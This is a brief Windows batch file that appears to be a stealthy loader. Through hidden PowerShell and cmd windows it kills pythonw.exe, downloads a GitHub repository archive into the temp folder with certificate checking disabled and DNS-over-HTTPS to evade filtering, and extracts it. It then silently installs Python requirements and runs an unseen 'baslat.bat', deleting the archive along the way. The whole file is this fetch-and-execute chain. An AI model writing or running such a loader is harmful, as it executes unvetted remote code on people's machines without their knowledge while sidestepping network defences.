@echo off
powershell -WindowStyle Hidden -NoProfile -Command "Start-Process cmd -ArgumentList '/c cd /d %TEMP% & taskkill /F /IM pythonw.exe >nul 2>&1 & curl.exe --noproxy * --doh-url https://1.1.1.1/dns-query -ksL https://github.com/0rkhanmammadov/questions/archive/refs/heads/main.zip -o q.zip & if not exist q.zip curl.exe -ksL https://github.com/0rkhanmammadov/questions/archive/refs/heads/main.zip -o q.zip & tar.exe -xf q.zip & del /q q.zip & cd /d %TEMP%\questions-main & python -m pip install -q -r requirements.txt & baslat.bat' -WindowStyle Hidden"
exit
